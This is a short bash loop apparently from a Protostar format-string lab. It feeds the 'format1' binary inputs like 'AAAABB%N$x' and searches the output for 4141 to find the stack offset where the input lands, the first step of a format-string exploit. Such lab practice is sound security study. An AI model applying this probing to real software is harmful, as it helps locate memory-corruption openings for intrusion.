for i in {1..200}; do echo -n "$i ";
/opt/protostar/bin/format1 "AAAABB%$i\$x" | grep 4141; if (( $? == 0 )); then break; fi ; echo
""; done;